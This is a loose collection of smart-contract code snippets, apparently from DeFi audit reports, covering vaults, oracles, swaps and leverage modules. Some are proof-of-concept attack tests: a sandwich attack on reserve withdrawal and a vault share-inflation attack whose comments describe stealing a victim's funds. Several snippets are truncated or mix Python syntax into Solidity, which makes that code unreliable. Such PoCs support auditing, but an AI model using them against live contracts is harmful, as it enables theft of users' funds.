"```\nexchangeRate = (cash + totalBorrows - reserves) / dTokenSupply\n```\ndiff --git a/new-dodo-v3/test/DODOV3MM/D3Vault/D3Vault.t.sol b/new-dodo-v3/test/DODOV3MM/D3Vault/D3Vault.t.sol\nindex a699162..337d1f5 100644\n--- a/new-dodo-v3/test/DODOV3MM/D3Vault/D3Vault.t.sol\nb/new-dodo-v3/test/DODOV3MM/D3Vault/D3Vault.t.sol\n@@ -233,6 +233,47 @@\ncontract D3VaultTest is TestContext {\n    function testWithdrawReservesSandwichAttack() public {\n        // Get dToken\n        (address dToken2) = d3Vault.getAssetInfo(address(token2));\n\n        // Approve tokens\n        vm.prank(user1);\n        token2.approve(address(dodoApprove), type(uint256).max);\n        vm.prank(user2);\n        token2.approve(address(dodoApprove), type(uint256).max);\n        vm.prank(user2);\n        D3Token(dToken2).approve(address(dodoApprove), type(uint256).max);\n\n        // Set user quotas and mint tokens\n        mockUserQuota.setUserQuota(user1, address(token2), 1000 ether);\n        mockUserQuota.setUserQuota(user2, address(token2), 1000 ether);\n        token2.mint(user1, 1000 ether);\n        token2.mint(user2, 1000 ether);\n\n        // User 1 deposits to allow pool to borrow\n        vm.prank(user1);\n        d3Proxy.userDeposit(user1, address(token2), 500 ether);\n        token2.mint(address(d3MM), 100 ether);\n        poolBorrow(address(d3MM), address(token2), 100 ether);\n\n        vm.warp(365 days);\n\n        // Accrue interest from pool borrow\n        d3Vault.accrueInterest(address(token2));\n        uint256 reserves = d3Vault.getReservesInVault(address(token2));\n\n        // User 2 performs a sandwich attack on the withdrawReserves call to make a profit\n        vm.prank(user2);\n        d3Proxy.userDeposit(user2, address(token2), 100 ether);\n        vm.prank(vaultOwner);\n        d3Vault.withdrawReserves(address(token2), reserves);\n        uint256 dTokenBalance = D3Token(dToken2).balanceOf(user2);"
```\nrecord.amount = borrows - debtToCover;\n```
"```\nfunction sellTokens(\n    address pool,\n    address to,\n    address fromToken,\n    address toToken,\n    uint256 fromAmount,\n    uint256 minReceiveAmount,\n    bytes calldata data,\n    uint256 deadLine\n) public payable judgeExpired(deadLine) returns (uint256 receiveToAmount) {\n    if (fromToken == _ETH_ADDRESS_) {\n        require(msg.value == fromAmount, ""D3PROXY_VALUE_INVALID"");\n        receiveToAmount = ID3MM(pool).sellToken(to, _WETH_, toToken, fromAmount, minReceiveAmount, data);\n    } else if (toToken == _ETH_ADDRESS_) {\n        receiveToAmount = ID3MM(pool).sellToken(address(this), fromToken, _WETH_, fromAmount, minReceiveAmount, data);\n        _withdrawWETH(to, receiveToAmount);\n        // multicall withdraw weth to user\n    } else {\n        receiveToAmount = ID3MM(pool).sellToken(to, fromToken, toToken, fromAmount, minReceiveAmount, data);\n    }\n}\n```\n```\n// File: D3Trading.sol\n// Method: sellToken()\n\n108. _transferOut(to, toToken, receiveToAmount);\n\n110.     // external call & swap callback\n111. IDODOSwapCallback(msg.sender).d3MMSwapCallBack(fromToken, fromAmount, data);\n\n112.     // transfer mtFee to maintainer\n113. _transferOut(state._MAINTAINER_, toToken, mtFee);\n\n115. require(\n116. IERC20(fromToken).balanceOf(address(this)) - state.balances[fromToken] >= fromAmount,\n117.     Errors.FROMAMOUNT_NOT_ENOUGH\n118. );\n```\n```\n// File: D3Proxy.sol\n\nfunction d3MMSwapCallBack(address token, uint256 value, bytes calldata _data) external override {\n    require(ID3Vault(_D3_VAULT_).allPoolAddrMap(msg.sender), ""D3PROXY_CALLBACK_INVALID"");\n    SwapCallbackData memory decodeData;\n    decodeData = abi.decode(_data, (SwapCallbackData));\n    _deposit(decodeData.payer, msg.sender, token, value);\n}\n```"
"```\nfunction _poolRepayAll(address pool, address token) internal {\n    // Code here\n    info.totalBorrows = info.totalBorrows - amount;\n    info.balance = info.balance - amount;\n    // Code here\n}\n```\n```\nfunction repayAll(address token) external onlyOwner nonReentrant poolOngoing {\n    ID3Vault(state._D3_VAULT_).poolRepayAll(token);\n    _updateReserve(token);\n    require(checkSafe(), Errors.NOT_SAFE);\n}\n```\n```\nfunction _poolRepayAll(address pool, address token) internal {\n    //...\n\n    info.totalBorrows = info.totalBorrows - amount;\n    info.balance = info.balance - amount; // amount should be added here\n\n    IERC20(token).safeTransferFrom(pool, address(this), amount);\n\n    emit PoolRepay(pool, token, amount, interests);\n}\n```\n```\nfunction userDeposit(address user, address token) external nonReentrant allowedToken(token) {\n    AssetInfo storage info = assetInfo[token];\n    uint256 realBalance = IERC20(token).balanceOf(address(this)); // check tokens owned by vault\n    uint256 amount = realBalance - info.balance; // amount = 120000-80000\n\n    IDToken(info.dToken).mint(user, dTokenAmount);\n    info.balance = realBalance;\n\n    emit UserDeposit(user, token, amount);\n}\n```"
```\nuint256 realDebt = \n    borrows.div(record.interestIndex == 0? 1e18 : record.interestIndex).mul(info.borrowIndex);\n```\n```\ninfo.totalBorrows = info.totalBorrows - realDebt\n```
"```\nfunction userWithdraw(\n    address to,\n    address user,\n    address token,\n    uint256 dTokenAmount\n) external nonReentrant allowedToken(token) returns (uint256 amount) {\n    accrueInterest(token);\n    AssetInfo storage info = assetInfo[token];\n    require(dTokenAmount <= IDToken(info.dToken).balanceOf(msg.sender), Errors.DTOKEN_BALANCE_NOT_ENOUGH);\n\n    amount = dTokenAmount.mul(_getExchangeRate(token));\n\n    IDToken(info.dToken).burn(msg.sender, dTokenAmount);\n    IERC20(token).safeTransfer(to, amount);\n    info.balance = info.balance - amount;\n\n    emit UserWithdraw(msg.sender, user, token, amount);\n}\n```\n```\nfunction _getExchangeRate(address token) internal view returns (uint256) {\n    AssetInfo storage info = assetInfo[token];\n    uint256 cash = getCash(token);\n    uint256 dTokenSupply = IERC20(info.dToken).totalSupply();\n    if (dTokenSupply == 0) {\n        return 1e18;\n    }\n    return (cash + info.totalBorrows - (info.totalReserves - info.withdrawnReserves)).div(dTokenSupply);\n}"
"```\n(uint80 roundID, int256 price, uint256 updatedAt, uint80 answeredInRound) = priceFeed.latestRoundData();\n\nrequire(price > 0, ""Chainlink: Incorrect Price"");\nrequire(block.timestamp - updatedAt < priceSources[token].heartBeat, ""Chainlink: Stale Price"");\nrequire(answeredInRound >= roundID, ""Chainlink: Stale Price"");\n```"
```\nif (tokenDecimal!= 18) {\n    uint256 fixDecimal = 18 - tokenDecimal;\n    bidDownPrice = bidDownPrice / (10 ** fixDecimal);\n    bidUpPrice = bidUpPrice / (10 ** fixDecimal);\n    askDownPrice = askDownPrice * (10 ** fixDecimal);\n    askUpPrice = askUpPrice * (10 ** fixDecimal);\n}\n```
```\nFile: D3Trading.sol\n\nroState.toTokenMMInfo.cumulativeBid = \n    allFlag(toTokenIndex) & 1 == 0? 0 : \n    tokenCumMap[toToken].cumulativeAsk;\n```\n```\nFile: PMMRangeOrder.sol\n\ntokenState.B = askOrNot? \n    tokenState.B0 - tokenMMInfo.cumulativeAsk : \n    tokenState.B0 - tokenMMInfo.cumulativeBid;\n```
"```\nif (balance >= borrows) {\n    collateral += min(balance - borrows, info.maxCollateralAmount).mul(info.collateralWeight).mul(price);\n} else {\n    debt += (borrows - balance).mul(info.debtWeight).mul(price);\n}\n```\n```\nAssume a pool has the following balances and debts:\n\nToken A - 100 borrows 125 balance\nToken B - 100 borrows 80 balance\n\nPrice A = 1\ncollateralWeightA = 0.8\n\nPrice B = 1\ndebtWeightB = 1.2\n\ncollateral = 25 * 1 * 0.8\ncollateral = 20\n\ndebt = 20 * 1 * 1.2\ndebt = 24\n\ncollateralRatio = 20 / 24\ncollateralRatio = 0.83\n```\n```\nExcessCollateral = 125 - 100\nExcessCollateral = 25\n\nExcessCollateral = 25 * 1 * 0.95\nExcessCollateral = 23.75\n\nExcessDebt = 100 - 80\nExcessDebt = 20\n\nExcessDebt = 20 * 1\nExcessDebt = 20\n```"
"```\nfor (uint256 i = 0; i < tokenList.length; i++) {\n    address _token = tokenList[i];\n    (address assetDToken,) = d3Vault.getAssetInfo(_token);\n    uint256 tokenBalance = IERC20(assetDToken).balanceOf(user);\n    if (tokenBalance > 0) {\n        tokenBalance = tokenBalance.mul(d3Vault.getExchangeRate(_token));\n        (uint256 tokenPrice, uint8 priceDecimal) = ID3Oracle(d3Vault._ORACLE_()).getOriginalPrice(_token);\n        usedQuota = usedQuota + tokenBalance * tokenPrice / 10 ** (priceDecimal + tokenDecimals);\n    }\n}\n```"
"```\nfunction testQueryFail() public {\n    token1ChainLinkOracle.feedData(30647 * 1e18);\n    token2ChainLinkOracle.feedData(1 * 1e18);\n    vm.startPrank(maker);\n\n    uint32[] memory tokenKs = new uint32[](2);\n    tokenKs[0] = 0;\n    tokenKs[1] = (1 << 16) + 1;\n\n    address[] memory tokens = new address[](2);\n    tokens[0] = address(token2);\n    tokens[1] = address(token1);\n\n    address[] memory slotIndex = new address[](2);\n    slotIndex[0] = address(token1);\n    slotIndex[1] = address(token2);\n\n    uint80[] memory priceSlot = new uint80[](2);\n    priceSlot[0] = 2191925019632266903652;\n    priceSlot[1] = 720435765840878108682;\n\n    uint64[] memory amountslot = new uint64[](2);\n    amountslot[0] = stickAmount(10, 8, 400000, 18);\n    amountslot[1] = stickAmount(400000, 18, 400000, 18);\n\n    d3MakerWithPool.setTokensKs(tokens, tokenKs);\n    d3MakerWithPool.setTokensPrice(slotIndex, priceSlot);\n    d3MakerWithPool.setTokensAmounts(slotIndex, amountslot);\n    vm.stopPrank();\n\n    (uint256 askDownPrice, uint256 askUpPrice, uint256 bidDownPrice, uint256 bidUpPrice, uint256 swapFee) =\n        d3MM.getTokenMMPriceInfoForRead(address(token1));\n\n    assertEq(askDownPrice, 304555028000000000000000000000000);\n    assertEq(askUpPrice, 307231900000000000000000000000000);\n    assertEq(bidDownPrice, 3291);\n    assertEq(bidUpPrice, 3320);\n    assertEq(swapFee, 1200000000000000);\n\n    (uint256 askDownPrice2, uint256 askUpPrice2, uint256 bidDownPrice2, uint256 bidUpPrice2, uint256 swapFee2) =\n        d3MM.getTokenMMPriceInfoForRead(address(token2));\n\n    assertEq(askDownPrice2, 999999960000000000);"
"```\nuint256 payFromToken = d3Proxy.buyTokens(\n    address(d3MM),\n    user1,\n    address(token1),\n    address(token2),\n    10000000,\n    0,\n    abi.encode(swapData),\n    block.timestamp + 1000\n);\nassert(payFromToken == 0);\n```"
"```\nbool isToken0Weth;\n_permit2Add(params_, amount0, amount1, token0, token1);\n\n_addLiquidity(\n    params_.addData.vault,\n    amount0,\n    amount1,\n    sharesReceived,\n    params_.addData.gauge,\n    params_.addData.receiver,\n    token0,\n    token1\n);\n\nif (msg.value > 0) {\n    if (isToken0Weth && msg.value > amount0) {\n        payable(msg.sender).sendValue(msg.value - amount0);\n    } else if (!isToken0Weth && msg.value > amount1) {\n        payable(msg.sender).sendValue(msg.value - amount1);\n    }\n}\n```"
"```\nif (sqrtRatioX96 <= sqrtRatioAX96):\n    amount0 = SafeCast.toUint256(\n        SqrtPriceMath.getAmount0Delta(\n            sqrtRatioAX96,\n            sqrtRatioBX96,\n            liquidity\n        )\n    )\n```\n```\nif (_slot0.tick < params.tickLower):\n    amount0 = SqrtPriceMath.getAmount0Delta(\n        TickMath.getSqrtRatioAtTick(params.tickLower),\n        TickMath.getSqrtRatioAtTick(params.tickUpper),\n        params.liquidityDelta\n    )\n```"
"```\ntry priceFeedA.latestRoundData() returns (\n    uint80,\n    int256 price,\n    uint256,\n    uint256 updatedAt,\n    uint80\n) {\n    require(\n        block.timestamp - updatedAt <= outdated,\n        ""ChainLinkOracle: priceFeedA outdated.""\n    );\n\n    priceA = SafeCast.toUint256(price);\n}\n\ncatch {\n    revert(""ChainLinkOracle: price feed A call failed."");\n}\n\ntry priceFeedB.latestRoundData() returns (\n    uint80,\n    int256 price,\n    uint256,\n    uint256 updatedAt,\n    uint80\n) {\n    require(\n        block.timestamp - updatedAt <= outdated,\n        ""ChainLinkOracle: priceFeedB outdated.""\n    );\n\n    priceB = SafeCast.toUint256(price);\n}\n\ncatch {\n    revert(""ChainLinkOracle: price feed B call failed."");\n}\n```"
"```\nfunction _applyFees(uint256 fee0_, uint256 fee1_) internal {\n    uint16 mManagerFeeBPS = managerFeeBPS;\n    managerBalance0 += (fee0_ * mManagerFeeBPS) / hundredPercent;\n    managerBalance1 += (fee1_ * mManagerFeeBPS) / hundredPercent;\n}\n```\n```\nfunction setManagerFeeBPS(uint16 managerFeeBPS_) external onlyManager {\n    require(managerFeeBPS_ <= 10000, ""MFO"");\n    managerFeeBPS = managerFeeBPS_;\n    emit LogSetManagerFeeBPS(managerFeeBPS_);\n}\n```"
```\nIUniswapV3Pool(underlyingTrustedPools[500].poolAddress)
"```\n_withdraw(_totalSupply, _totalSupply)\n```\n```\n_deposit(reserve0, reserve1, _totalSupply, slots)"
"```\n(uint256 amount0, uint256 amount1) = \n    LiquidityAmounts.getAmountsForLiquidity(\n        slots[i].currentSqrtRatioX96,\n        TickMath.getSqrtRatioAtTick(position.lowerTick),\n        TickMath.getSqrtRatioAtTick(position.upperTick),\n        liquidity\n    );\n```\n```\nreserve0 += amount0;\nreserve1 += amount1;\n```"
"```\nfunction _estimateWithdrawalLp(\n    uint256 reserve0,\n    uint256 reserve1,\n    uint256 _totalSupply,\n    uint256 amount0,\n    uint256 amount1\n) private pure returns (uint256 shareAmount) {\n    shareAmount = (\n        (amount0 * _totalSupply) / reserve0 +\n        (amount1 * _totalSupply) / reserve1\n    ) / 2;\n}\n```\n```\nuint256 lpAmount;\n\n(uint256 fee0, uint256 fee1) = _calcFees(feesGrow, user);\n\nlpAmount = _estimateWithdrawalLp(reserve0, reserve1, _totalSupply, fee0, fee1);\n\nuser.shares -= lpAmount;\n\n_withdrawFee(pool, lpAmount, reserve0, reserve1, _totalSupply, deviationBP);\n```"
"```\nfunction _addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) {\n    // Create the pair if it doesn't exist yet\n    if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n        IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n    }\n    (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n    if (reserveA == 0 && reserveB == 0) {\n        (amountA, amountB) = (amountADesired, amountBDesired);\n    } else {\n        uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n        if (amountBOptimal <= amountBDesired) {\n            require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n            (amountA, amountB) = (amountADesired, amountBOptimal);\n        } else {\n            uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n            assert(amountAOptimal <= amountADesired);\n            require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n            (amountA, amountB) = (amountAOptimal, amountBDesired);\n        }\n    }\n}\n\nfunction addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n    (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n    TransferHelper.safeTransferFrom(token\n```\ndef modifier(ensure):\n    require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED')\n    _;\n```"
"```\n//Pool.sol\nfunction addQuoteToken(\n    uint256 amount_,\n    uint256 index_,\n    uint256 expiry_\n) external override nonReentrant returns (uint256 bucketLP_) {\n    _revertAfterExpiry(expiry_);\n    PoolState memory poolState = _accruePoolInterest();\n    // round to token precision\n    amount_ = _roundToScale(amount_, poolState.quoteTokenScale);\n    uint256 newLup;\n    (bucketLP_, newLup) = LenderActions.addQuoteToken(\n        buckets,\n        deposits,\n        poolState,\n        AddQuoteParams({\n            amount: amount_,\n            index: index_\n        })\n    );\n}\n```\npragma solidity ^0.8.0;\n\ncontract LenderActions {\n    function addQuoteToken(\n        mapping(uint256 => Bucket) storage buckets_,\n        DepositsState storage deposits_,\n        PoolState calldata poolState_,\n        AddQuoteParams calldata params_\n    ) external returns (uint256 bucketLP_, uint256 lup_) {\n        uint256 lupIndex = Deposits.findIndexOfSum(deposits_, poolState_.debt);\n        bool depositBelowLup = lupIndex!= 0 && params_.index > lupIndex;\n        if (depositBelowLup) {\n            addedAmount = Maths.wmul(addedAmount, Maths.WAD - _depositFeeRate(poolState_.rate));\n        }\n        Deposits.unscaledAdd(deposits_, params_.index, unscaledAmount);\n    }\n}\n```"
"```\nit('pending deposit pushed by 1 epoch causing shares difference', async () => {\n  const smallDeposit = utils.parseEther('1000')\n  const smallestDeposit = utils.parseEther('0.000001')\n\n  await updateOracleEth() // epoch now stale\n  await vault.connect(user).deposit(smallDeposit, user.address)\n  await updateOracleBtc()\n  await vault.sync()\n\n  await updateOracleEth() // epoch now stale\n  await vault.connect(user2).deposit(smallestDeposit, user.address)\n  await updateOracleBtc()\n  await vault.sync()\n\n  await updateOracle()\n  await vault.syncAccount(user.address)\n\n  const totalSupply = await vault.totalSupply()\n  const balanceUser1 = await vault.balanceOf(user.address)\n  const balanceUser2 = await vault.balanceOf(user2.address)\n\n  console.log(totalSupply);\n  console.log(balanceUser1.add(balanceUser2));\n})"
"```\nminRoundId = 1\nmaxRoundId = 1001\n\nwhile minRoundId + 1 < maxRoundId:\n    print(f""->\nminRoundId={minRoundId}\nmaxRoundId={minRoundId * 2 - 1}"")\n\n    minRoundId *= 2\n```"
"```\nit('exchange rate manipulation', async () => {\n  const smallDeposit = utils.parseEther('1')\n  const smallestDeposit = utils.parseEther('0.000000000000000001')\n\n  await vault.connect(user).deposit(smallestDeposit, user.address)\n  await updateOracle()\n  await vault.sync()\n\n  console.log(await vault.totalSupply())\n\n  await dsu.connect(user).transfer(vault.address, utils.parseEther('1'))\n\n  console.log(await vault.totalAssets())\n\n  await updateOracle()\n  await vault.sync()\n  await vault.connect(user2).deposit(smallDeposit, user2.address)\n  await updateOracle()\n  await vault.sync()\n\n  console.log(await vault.totalAssets())\n  console.log(await vault.totalSupply())\n  console.log(await vault.balanceOf(user2.address))\n\n  // the amount of shares the victim receives is rounded down to 0\n  // at this point there are 2000000000000000001 Wei of assets in the Vault and only 1 Wei of shares\n  // which is owned by the attacker.\n  // This means the attacker has stolen all funds from the victim.\n})"
"```\nfunction closeMakeFor(\n    address account,\n    UFixed18 amount\n) \n    public \n    nonReentrant \n    notPaused \n    onlyAccountOrMultiInvoker(account) \n    settleForAccount(account) \n    takerInvariant \n    closeInvariant(account) \n    liquidationInvariant(account)\n{\n    _closeMake(account, amount);\n}\n```\n```\nfunction closeAll(address account) external onlyCollateral notClosed settleForAccount(account) {\n    AccountPosition storage accountPosition = _positions[account];\n    Position memory p = accountPosition.position.next(_positions[account].pre);\n\n    // Close all positions\n    _closeMake(account, p.maker);\n    _closeTake(account, p.taker);\n\n    accountPosition.liquidation = true;\n}\n```"
"```\nfunction liquidate(\n    address account,\n    IProduct product\n) external nonReentrant notPaused isProduct(product) settleForAccount(account, product) {\n    if (product.isLiquidating(account)) {\n        revert CollateralAccountLiquidatingError(account);\n    }\n\n    UFixed18 totalMaintenance = product.maintenance(account);\n    UFixed18 totalCollateral = collateral(account, product);\n\n    if (!totalMaintenance.gt(totalCollateral)) {\n        revert CollateralCantLiquidate(totalMaintenance, totalCollateral);\n    }\n\n    product.closeAll(account);\n\n    // claim fee\n    UFixed18 liquidationFee = controller().liquidationFee();\n\n    UFixed18 collateralForFee = UFixed18Lib.max(totalMaintenance, controller().minCollateral());\n    UFixed18 fee = UFixed18Lib.min(totalCollateral, collateralForFee.mul(liquidationFee));\n\n    _products[product].debitAccount(account, fee);\n    token.push(msg.sender, fee);\n\n    emit Liquidation(account, product, msg.sender, fee);\n}\n```"
"```\nif (shares.gt(_maxRedeemAtEpoch(context, accountContext, account))) {\n    revert BalancedVaultRedemptionLimitExceeded();\n}\n```"
"```\nfunction _calculateMaxBorrowCollateral(\n    ActionInfo memory _actionInfo,\n    bool _isLever\n) internal view returns (uint256) {\n    (, uint256 maxLtvRaw, uint256 liquidationThresholdRaw,,,,,,,) = \n        strategy.aaveProtocolDataProvider.getReserveConfigurationData(address(strategy.collateralAsset));\n\n    // Normalize LTV and liquidation threshold to precise units. LTV is measured in 4 decimals in Aave which is why we must multiply by 1e14\n    // for example ETH has an LTV value of 8000 which represents 80%\n    if (_isLever) {\n        uint256 netBorrowLimit = _actionInfo.collateralValue\n           .preciseMul(maxLtvRaw.mul(10 ** 14))\n           .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n        return netBorrowLimit\n           .sub(_actionInfo.borrowValue)\n           .preciseDiv(_actionInfo.collateralPrice);\n    }\n}\n```\nfunction getReserveConfigurationData(\n    address asset\n) \n    external \n    view \n    override \n    returns (\n        // rest of code\n    )\n{\n    DataTypes.ReserveConfigurationMap memory configuration = IPool(ADDRESSES_PROVIDER.getPool())\n       .getConfiguration(asset);\n\n    (ltv, liquidationThreshold, liquidationBonus, decimals, reserveFactor) = configuration.getParams();\n}"
```\nelse {\n    uint256 netRepayLimit = _actionInfo.collateralValue\n       .preciseMul(liquidationThresholdRaw.mul(10 ** 14))\n       .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n    return _actionInfo.collateralBalance\n       .preciseMul(netRepayLimit.sub(_actionInfo.borrowValue))\n       .preciseDiv(netRepayLimit);\n}\n```
"```\nfunction setIncentiveSettings(IncentiveSettings memory _newIncentiveSettings) external onlyOperator noRebalanceInProgress {\n    incentive = _newIncentiveSettings;\n\n    _validateNonExchangeSettings(methodology, execution, incentive);\n\n    emit IncentiveSettingsUpdated(\n        incentive.etherReward,\n        incentive.incentivizedLeverageRatio,\n        incentive.incentivizedSlippageTolerance,\n        incentive.incentivizedTwapCooldownPeriod\n    );\n}\n```"
"```\n/**\n * Calculate total notional rebalance quantity and chunked rebalance quantity in collateral units.\n *\n * return uint256          Chunked rebalance notional in collateral units\n * return uint256          Total rebalance notional in collateral units\n */\nfunction _calculateChunkRebalanceNotional(\n    LeverageInfo memory _leverageInfo,\n    uint256 _newLeverageRatio,\n    bool _isLever\n)\n    internal\n    view\n    returns (uint256, uint256)\n{\n    uint256 leverageRatioDifference = _isLever\n       ? _newLeverageRatio.sub(_leverageInfo.currentLeverageRatio)\n        : _leverageInfo.currentLeverageRatio.sub(_newLeverageRatio);\n\n    uint256 totalRebalanceNotional = leverageRatioDifference.preciseDiv(_leverageInfo.currentLeverageRatio).preciseMul(_leverageInfo.action.collateralBalance);\n\n    uint256 maxBorrow = _calculateMaxBorrowCollateral(_leverageInfo.action, _isLever);\n\n    uint256 chunkRebalanceNotional = Math.min(Math.min(maxBorrow, totalRebalanceNotional), _leverageInfo.twapMaxTradeSize);\n\n    return (chunkRebalanceNotional, totalRebalanceNotional);\n}\n\n/**\n * Calculate the max borrow / repay amount allowed in base units for lever / delever. This is due to overcollateralization requirements on\n * assets deposited in lending protocols for borrowing.\n *\n * For lever, max borrow is calculated as:\n * (Net borrow limit in USD - existing borrow value in USD) / collateral asset price adjusted for decimals\n *\n * For delever, max repay is calculated as:\n * Collateral balance in base units * (net borrow limit in USD - existing borrow value in USD) / net borrow limit in USD\n *\n * Net borrow limit for levering is calculated as:\n * The collateral value in USD * Aave collateral factor * (1 - unutilized leverage %)\n *\n * Net repay limit for delevering is calculated as:\n * The collateral value in USD * Aave liquiditon threshold * (1 - unutilized leverage %)\n *\n * return uint256          Max borrow notional denominated in collateral asset\n */\nfunction _calculateMaxBorrowCollateral(ActionInfo memory _actionInfo, bool _isLever) internal view returns (uint256) {\n    (, uint256 maxLtvRaw, uint256 liquidationThresholdRaw,,,,,"
```\nint256 rawCollateralPrice = strategy.collateralPriceOracle.latestAnswer();\nrebalanceInfo.collateralPrice = rawCollateralPrice.toUint256().mul(10 ** strategy.collateralDecimalAdjustment);\n\nint256 rawBorrowPrice = strategy.borrowPriceOracle.latestAnswer();\nrebalanceInfo.borrowPrice = rawBorrowPrice.toUint256().mul(10 ** strategy.borrowDecimalAdjustment);\n```
"```\nfunction _calculateMinRepayUnits(\n    uint256 _collateralRebalanceUnits,\n    uint256 _slippageTolerance,\n    ActionInfo memory _actionInfo\n) internal pure returns (uint256) {\n    return _collateralRebalanceUnits\n       .preciseMul(_actionInfo.collateralPrice)\n       .preciseDiv(_actionInfo.borrowPrice)\n       .preciseMul(PreciseUnitMath.preciseUnit().sub(_slippageTolerance));\n}\n```"
```\nfunction _createActionInfo() internal view returns (ActionInfo memory) {\n    ActionInfo memory rebalanceInfo;\n\n    // Calculate prices from chainlink.\n    int256 rawCollateralPrice = strategy.collateralPriceOracle.latestAnswer();\n    rebalanceInfo.collateralPrice = rawCollateralPrice.toUint256().mul(10 ** strategy.collateralDecimalAdjustment);\n\n    int256 rawBorrowPrice = strategy.borrowPriceOracle.latestAnswer();\n    rebalanceInfo.borrowPrice = rawBorrowPrice.toUint256().mul(10 ** strategy.borrowDecimalAdjustment);\n\n    // More Code\n    // rest of code.\n}\n```
"```\nActionInfo memory deleverInfo = \n    _createAndValidateActionInfo(\n        _setToken,\n        _collateralAsset,\n        _repayAsset,\n        _redeemQuantityUnits,\n        _minRepayQuantityUnits,\n        _tradeAdapterName,\n        false\n    );\n```\n```\n_withdraw(deleverInfo.setToken, deleverInfo.lendingPool, _collateralAsset, deleverInfo.notionalSendQuantity);\n\nuint256 postTradeReceiveQuantity = _executeTrade(deleverInfo, _collateralAsset, _repayAsset, _tradeData);\n\nuint256 protocolFee = _accrueProtocolFee(_setToken, _repayAsset, postTradeReceiveQuantity);\n\nuint256 repayQuantity = postTradeReceiveQuantity.sub(protocolFee);\n\n_repayBorrow(deleverInfo.setToken, deleverInfo.lendingPool, _repayAsset, repayQuantity)\n```\n```\nfunction _repayBorrow(ISetToken _setToken, ILendingPool _lendingPool, IERC20 _asset, uint256 _notionalQuantity) internal {\n    _setToken.invokeApprove(address(_asset), address(_lendingPool), _notionalQuantity);\n    _setToken.invokeRepay(_lendingPool, address(_asset), _notionalQuantity, BORROW_RATE_MODE);\n}\n```\n```\nuint256 paybackAmount = params.interestRateMode == DataTypes.InterestRateMode.STABLE\n   ? stableDebt\n    : variableDebt;\n```\n```\nreserveCache.nextScaledVariableDebt = IVariableDebtToken(\n    reserveCache.variableDebtTokenAddress\n).burn(\n    params.onBehalfOf,\n    paybackAmount,\n    reserveCache.nextVariableBorrowIndex\n)\n```\nfunction _repayBorrow(ISetToken _setToken, ILendingPool _lendingPool, IERC20 _asset, uint256 _notionalQuantity) internal {\n    _setToken.invokeApprove(address(_asset), address(_lendingPool), _notionalQuantity);\n    _setToken.invokeRepay(_lendingPool, address(_asset), _notionalQuantity, BORROW_RATE_MODE);\n}\n```"
```\nL2_Alias = L1_Contract_Address + 0x1111000000000000000000000000000000001111\n```
```\nif (_isLever) {\n    uint256 netBorrowLimit = _actionInfo.collateralValue\n       .preciseMul(maxLtvRaw.mul(10 ** 14))\n       .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n    return netBorrowLimit\n       .sub(_actionInfo.borrowValue)\n       .preciseDiv(_actionInfo.collateralPrice);\n} else {\n    uint256 netRepayLimit = _actionInfo.collateralValue\n       .preciseMul(liquidationThresholdRaw.mul(10 ** 14))\n       .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n    return _actionInfo.collateralBalance\n       .preciseMul(netRepayLimit.sub(_actionInfo.borrowValue))\n       .preciseDiv(netRepayLimit);\n}
```\nuint256 tokenReserve = _getBalance(token);\nuint256 tokenCollateral = IInsurancePool(insurancePool).getCollateral(token);\n```
"```\naddress priceQuoteToken = _getPriceQuoteToken(tokenIn, tokenOut);\nprice = oracle.getLatestPrice(priceQuoteToken);\n_checkPrice(priceQuoteToken, price);\n\nfeeNumerator = isBuy? pair.buyFee : pair.sellFee;\nfeeToken = IERC20Token(priceQuoteToken == tokenIn? tokenOut : tokenIn);\n\nSwapRequest memory request;\nrequest.tokenIn = tokenIn;\nrequest.tokenOut = tokenOut;\nrequest.amountType = amountType;\nrequest.amount = amount;\nrequest.feeNumerator = feeNumerator;\nrequest.feeBase = tokenManager.SWAP_FEE_BASE();\nrequest.feeToken = address(feeToken);\nrequest.price = price;\nrequest.priceBase = 10 ** oracle.decimals();\nrequest.quoteToken = priceQuoteToken;\n\n(amountIn, amountOut, fee) = _calculateSwapResult(request);\n```\n```\ndef _calculateAmountOut(\n    request: Request,\n    amountIn: int,\n    tokenIn: str,\n    tokenOut: str\n) -> int:\n    amountOut = _convert(\n        tokenIn,\n        tokenOut,\n        amountIn,\n        MathUpgradeable.Rounding.Down,\n        request.price,\n        request.priceBase,\n        request.quoteToken\n    )\n    fee = _getFeeByAmountWithFee(amountOut, request.feeNumerator, request.feeBase)\n    amountOut -= fee\n    return amountOut\n```\n```\nfunction _convertByFromPrice(\n    address fromToken,\n    address toToken,\n    uint256 fromAmount,\n    MathUpgradeable.Rounding rounding,\n    uint256 price,\n    uint256 priceBase\n) internal view virtual returns (uint256) {\n    uint256 fromBase = 10 ** IERC20Metadata(fromToken).decimals();\n    uint256 toBase = 10 ** IERC20Metadata(toToken).decimals();\n\n    return fromAmount.mulDiv(price * toBase, priceBase * fromBase, rounding);\n}\n```"
